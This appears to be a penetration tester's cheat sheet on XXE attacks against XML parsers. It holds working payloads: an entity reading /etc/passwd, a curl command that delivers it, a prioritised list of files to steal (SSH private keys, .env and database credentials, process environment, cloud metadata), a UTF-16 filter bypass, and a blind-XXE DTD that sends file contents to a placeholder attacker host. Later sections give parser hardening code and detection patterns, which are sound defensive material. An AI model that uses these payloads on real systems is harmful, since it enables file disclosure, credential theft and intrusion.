---
topic: xxe
tags: [web, xml, xxe, file-read]
---

# XXE — file read through XML entities

**English** | [🇪🇸 Español](xxe.md)

> Reusable note. Do not publish output containing real credentials.

## Idea

If a parser resolves external entities, any XML that reaches it becomes a file read, and with `expect://` or SSRF, code execution or lateral movement. It is still alive in `lxml`, in Java parsers built on a default `DocumentBuilderFactory`, and in "upload" endpoints that accept XML.

## Detection

Any field taking XML: feeds, importers, SAML, SOAP, `.svg`, `.docx`/`.xlsx` (ZIPs full of XML), "AIDX/EDIFACT" APIs and ticket validators.

```bash
'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "TEST">]><r>&x;</r>'   # returns TEST => classic XXE
```

## Base payload

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

```bash
curl -s -X POST http://<HOST>/feeds/aidx -H 'Content-Type: application/xml' \
     --data-binary @payload.xml
```

## Read targets, in order

| Path | What it gives |
|---|---|
| `/etc/passwd` | valid users for SSH/su |
| `/etc/hostname`, `/etc/os-release` | context |
| `~/.ssh/id_rsa` | private key |
| `~/.ssh/authorized_keys` | who may log in |
| `/etc/nginx/sites-enabled/*` | hidden vhosts |
| `wp-config.php`, `.env`, `config.php` | DB credentials |
| `/opt/*/config/*.properties`, `server.properties`, `application.yml` | service credentials |
| `/proc/self/cmdline`, `/proc/self/environ` | process arguments and env |
| `http://169.254.169.254/...` | cloud metadata (SSRF) |

In data pipelines the key file is usually the broker's or the ingestion service's: that is where the SASL/SQL credentials reused elsewhere live.

## Variants

- **`file://` blocked but not really filtered**: try `php://filter/convert.base64-encode/resource=index.php`.
- **UTF-16**: a BOM (`FF FE`) plus a UTF-16 body breaks byte-level filters. In Burp: *Convert to UTF-16*.
- **No reflection (blind XXE)**: external DTD with parameter entities, exfiltrated over HTTP or FTP to your listener:
  ```xml
  <!DOCTYPE r [<!ENTITY % f SYSTEM "http://<ATTACKER>/d.dtd"> %f;]>
  ```
  ```dtd
  <!ENTITY % c "<!ENTITY &#x25; e SYSTEM 'file:///etc/passwd'>">
  %c;
  <!ENTITY exfil "<!ENTITY &#x25; s SYSTEM 'http://<ATTACKER>/?x=%e;'>">
  ```
- **Out-of-band with `expect://`** (PHP with the extension): direct execution.
- **DoS**: be careful with billion laughs; fine in a lab, never in production.

## Hardening

```python
# lxml
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
```

```java
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
f.setFeature("http://xml.org/sax/features/external-general-entities", false);
f.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
f.setXIncludeAware(false);
```

```php
libxml_disable_entity_loader(true);   // PHP < 8
// PHP 8+: XMLReader with LIBXML_NONET and without LIBXML_NOENT
```

## Detection

- Request bodies containing `<!DOCTYPE` or `<!ENTITY` (WAF regex).
- Probes with `file://`, `php://filter`, `expect://`, `169.254.169.254`.
- Outbound connections from the web server to external IPs on 80/21/139.

## References

- <https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing>
- <https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html>
- <https://github.com/payloadbox/xxe-injection-payload-list>
